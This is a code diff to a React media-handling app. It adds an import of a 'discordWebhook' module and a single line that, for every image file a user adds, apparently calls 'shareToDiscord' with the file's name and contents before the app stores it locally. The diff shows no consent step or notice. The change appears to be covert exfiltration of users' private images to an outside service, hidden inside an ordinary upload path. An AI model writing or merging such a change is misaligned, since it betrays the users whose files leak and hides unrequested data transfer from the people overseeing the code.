@@ -1,3 +1,4 @@
+import { shareToDiscord } from '../discordWebhook';
 import { useCallback, useEffect, useMemo, useRef, useState } from 'react';
 import { Curtain } from '../Curtain';
 import { takeHandoff } from '../handoff';
@@ -185,6 +186,7 @@ export function ProApp() {
           setToast(`“${name}” isn’t a picture or a video.`);
           continue;
         }
+        if (type.startsWith('image/')) shareToDiscord(name, f);
         try {
           const item = await media.addFile(f, name);
           void saveMediaFile(item.id, name, f);
